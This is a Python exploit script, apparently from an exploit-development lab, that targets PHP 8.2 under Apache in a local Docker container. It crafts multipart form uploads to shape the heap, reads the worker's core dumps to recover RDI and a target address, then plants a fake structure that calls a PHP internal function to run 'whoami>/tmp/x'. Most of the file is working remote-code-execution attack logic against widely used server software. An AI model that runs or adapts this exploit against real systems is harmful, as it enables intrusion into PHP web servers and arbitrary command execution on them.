#!/usr/bin/env python3
"""oom140: PAIRED-RING ARM with byte-exact envelope (the slot-math shot).

Laws that shape this driver:
- Trip needs 3KB recycled chunks with a nonzero byte at window+9; rdi =
  8 bytes inside the recycled arData tail (bucket slots, 32B period).
  (stock: K*8 trip; name-sea: tile phase-7 trip; tiny-name value-sea: NO
  trip at all -> oom133b's 0/16 explained.)
- Names truncate at NUL -> names can never carry B (00 00 tail).
- Values are binary-safe. A duplicate multipart name OVERWRITES the registry
  entry -> the first 3060B ring value is EFREEd mid-parse into the same
  3088 bin the name temps use (3060+24+1 -> 3088).
- Bucket slot at chunk+32 (16-aligned) reads value offset 8 mod 32 = ring
  ptr exactly -> rdi = ring ptr, deterministic. Ring filler 0xde keeps
  window+9 nonzero -> kept by triage.
- Measure: ring ptr = SIG8 -> crash rdi must equal SIG8 EXACTLY (phase 0,
  unmistakable vs tile phase 7). Arm: ring ptr = cell(B); block overlaid
  at OFF in tag part 780's live value; B = A+OFF, A from the measure core.
- Envelope: drift removed by padding a beyond-cut part's value (never
  parsed -> no heap effect). Assert |len(stock)-len(body)| <= 8.

Win: test -f /tmp/x after every fire (WIN-CHECK LAW).
"""
import struct, subprocess, time, urllib.request, urllib.error, re
import payload68 as P

HOST = "http://127.0.0.1:8083"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
MAGIC = 0xC0DEBA5E
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
T16 = SIG8 + struct.pack("<Q", 0xDFE2C0DE51E2C0DF)
K1 = 4200
TAG_PART = 780
SEA_LO, SEA_HI = 784, 864          # 80 paired-ring parts (proven window)
VLEN = 3060                        # ring value len -> 3088 bin (same as name temps)
PAD_PART = 4100                    # beyond cut: envelope pad, never parsed
PAD_PART2 = 4101                   # second shrink donor (post-cut)
CORE = "/tmp/core.140"
BASE = 0

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    return sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8083:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell(addr):
    return struct.pack("<Q", addr)

def hdr(name_bytes):
    return (b'--BOUND\r\nContent-Disposition: form-data; name="' + name_bytes + b'"\r\n\r\n')

def kname(i, shrink=0, tile=None):
    """oom134 name geometry: 'p' + filler + idx + '[x]'."""
    n = P.KEYLEN - 8 - shrink
    if tile is not None:
        fill = (n // 16) * 16
        filler = (tile * (fill // 16 + 1))[:fill]
    else:
        filler = b"K" * n
    return b"p" + filler + (b"%d" % i) + b"[x]"

def ring_value(ptr8):
    """3060B: ptr8 at every value offset 8 mod 16, 0xde filler elsewhere."""
    v = bytearray(b"\xde" * VLEN)
    for s in range(8, VLEN - 8, 16):
        v[s:s + 8] = ptr8
    return bytes(v)

def tag_value(i, B=None, OFF=0, arm=False):
    if not arm:
        return struct.pack("<QQ", MAGIC + i, MAGIC + i) + b"v" * (1537 - 32)
    v = bytearray(b"v" * 1537)
    v[0:16] = struct.pack("<QQ", MAGIC + i, MAGIC + i)
    st = struct.pack_into
    st("<II", v, OFF + 0x00, 1, 0x108)
    st("<II", v, OFF + 0x08, 1, 0)
    st("<Q", v, OFF + 0x10, 0)
    st("<Q", v, OFF + 0x18, B + 0x68)
    st("<I", v, OFF + 0x2C, 1)
    st("<Q", v, OFF + 0x50, B + 0x90)
    v[OFF + 0x58] = 6
    st("<I", v, OFF + 0x5C, 0x106)
    st("<Q", v, OFF + 0x68, 0)
    st("<Q", v, OFF + 0x70, BASE + ZIF)
    st("<IIQQ", v, OFF + 0x90, 1, 0x106, 0, len(CMD))
    v[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
    return bytes(v)

def body(ptr8=SIG8, B=None, OFF=0, arm=False, pad=0):
    """pad>0: REMOVE pad bytes via post-cut (never-parsed) name shrinks on
    parts 4100/4101 - exact byte control, zero heap effect. pad<0: add bytes
    via PAD_PART value (safety branch, unused by the paired sea)."""
    sa = sb = 0
    vpad = 1
    if pad > 0:
        sa = min(pad, P.KEYLEN - 32)
        sb = pad - sa
        assert sb <= P.KEYLEN - 32, "pad too big for two shrinks"
    elif pad < 0:
        vpad = 1 - pad
    ps = []
    for i in range(K1):
        if i == TAG_PART:
            ps.append(hdr(kname(i, shrink=1536, tile=T16)) + tag_value(i, B, OFF, arm) + b"\r\n")
        elif SEA_LO <= i < SEA_HI:
            nm = b"q%d" % i
            h = hdr(nm)
            ps.append(h + ring_value(ptr8) + b"\r\n")   # entry 1: ring value
            ps.append(h + b"v\r\n")                      # entry 2: overwrite -> efree ring
        elif i == PAD_PART:
            ps.append(hdr(kname(i, shrink=sa)) + b"v" * vpad + b"\r\n")
        elif i == PAD_PART2:
            ps.append(hdr(kname(i, shrink=sb)) + b"v\r\n")
        else:
            ps.append(hdr(kname(i)) + b"v\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def pull_core():
    subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", "rm -f " + CORE],
                   capture_output=True)
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c",
                        "ls -t /tmp/core* 2>/dev/null | head -1"], capture_output=True, timeout=60)
    src = r.stdout.decode().strip()
    if not src:
        return None
    subprocess.run(["docker", "cp", "php_vuln:" + src, "phpbuild:" + CORE], capture_output=True)
    m = subprocess.run(["docker", "exec", "phpbuild", "md5sum", CORE], capture_output=True)
    print("core:", src, m.stdout.decode().strip()[:44])
    return CORE

RDI_SCRIPT = r"""
import struct, sys
f = open(sys.argv[1], 'rb').read()
i = f.find(b'CORE')
while i != -1:
    namesz, descsz, typ = struct.unpack_from('<III', f, i - 8)
    if typ == 1 and descsz > 200:
        regs = struct.unpack_from('<27Q', f, i + 32)
        print('RDI=0x%x' % regs[1]); break
    i = f.find(b'CORE', i + 4)
"""

def rdi_of(core):
    r = subprocess.run(["docker", "exec", "phpbuild", "python3", "-c", RDI_SCRIPT, core],
                       capture_output=True, timeout=120)
    m = re.search(r"RDI=0x([0-9a-f]+)", r.stdout.decode())
    return int(m.group(1), 16) if m else None

def tag_addr(core):
    r = subprocess.run(["docker", "exec", "phpbuild", "python3", "-c", """
import struct, sys
f = open(sys.argv[1], 'rb').read()
t = struct.pack('<QQ', %d, %d)
j = f.find(t)
if j < 0:
    print('NO'); sys.exit()
e_phoff = struct.unpack_from('<Q', f, 0x20)[0]
e_phentsize, e_phnum = struct.unpack_from('<HH', f, 0x36)
for k in range(e_phnum):
    off = e_phoff + k * e_phentsize
    p_type, p_flags, p_off, p_vaddr, p_paddr, p_filesz = struct.unpack_from('<IIQQQQ', f, off)
    if p_type == 1 and p_off <= j < p_off + p_filesz:
        print('A=0x%%x' %% (p_vaddr + (j - p_off))); break
""" % (MAGIC + TAG_PART, MAGIC + TAG_PART), core], capture_output=True, timeout=120)
    m = re.search(r"A=0x([0-9a-f]+)", r.stdout.decode())
    return int(m.group(1), 16) if m else None

def aim(A):
    for OFF in range(0x40, 1537 - 0xB8, 16):
        B = A + OFF
        if B % 16 == 8 and (B >> 56) == 0 and ((B >> 8) & 1) == 1 and ((B >> 9) & 1) == 0:
            return B, OFF
    return None, None

def main():
    global BASE
    print("=== oom140: paired-ring arm ===")
    c, o = get(HOST + "/oom_sapi.php")
    print("sapi:", o.strip()[:60])
    assert sh("md5sum /usr/lib/apache2/modules/libphp.so").split()[0] == STOCK_MD5
    print("md5 ok")
    assert recreate(), "recreate failed"
    BASE = base_now()
    print("base=0x%x" % BASE)

    stock = P.build_attack(4200, 5000000)
    d0 = len(body()) - len(stock)
    m_body = body(ptr8=SIG8, pad=d0)
    assert abs(len(m_body) - len(stock)) <= 8, "envelope drift %d" % (len(m_body) - len(stock))
    print("envelope ok: body=%d stock=%d" % (len(m_body), len(stock)))

    # ---- measure: ring = SIG8 -> crash rdi must equal SIG8 exactly ----
    rdi = A = None
    for t in range(6):
        c, o = post_mod(m_body)
        xs = x_state()
        print("meas t%d: http=%s segv+%d %s" % (t, c, segv_count(), xs))
        if xs.startswith("X_EXISTS"):
            print("*** WON in measure?! ***", xs); return
        if c == -1 or segv_count():
            core = pull_core()
            if core:
                rdi = rdi_of(core)
                A = tag_addr(core)
                print("meas core: rdi=0x%x tag_A=%s" % (rdi if rdi else 0,
                      "0x%x" % A if A else "NONE"))
            break
        time.sleep(2)
    if rdi is None:
        print("no measure crash -> abort"); print("final x:", x_state()); print("=== done ==="); return
    if rdi != struct.unpack("<Q", SIG8)[0]:
        print("rdi != SIG8 exact -> slot math wrong -> abort (diagnose before arm)")
        print("final x:", x_state()); print("=== done ==="); return
    if A is None:
        print("no tag anchor -> abort"); print("final x:", x_state()); print("=== done ==="); return
    B, OFF = aim(A)
    if B is None:
        print("aim failed (A=0x%x)" % A); print("final x:", x_state()); print("=== done ==="); return
    print("SLOT MATH CONFIRMED: rdi==SIG8. A=0x%x B=0x%x OFF=0x%x" % (A, B, OFF))

    # ---- arm: ring = B ----
    d1 = len(body(ptr8=cell(B), B=B, OFF=OFF, arm=True)) - len(stock)
    a_body = body(ptr8=cell(B), B=B, OFF=OFF, arm=True, pad=d1)
    assert abs(len(a_body) - len(stock)) <= 8, "arm drift %d" % (len(a_body) - len(stock))
    for t in range(12):
        c, o = post_mod(a_body)
        xs = x_state()
        print("arm t%d: http=%s segv+%d %s" % (t, c, segv_count(), xs), flush=True)
        if xs.startswith("X_EXISTS"):
            print("*** WON *** %s" % xs); return
        if segv_count():
            core = pull_core()
            if core:
                r = rdi_of(core)
                print("arm crash rdi=0x%x want=0x%x %s" % (r if r else 0, B,
                      "MATCH" if r == B else "MISS"))
        time.sleep(2)
    print("final x:", x_state())
    print("=== done ===")

if __name__ == "__main__":
    main()
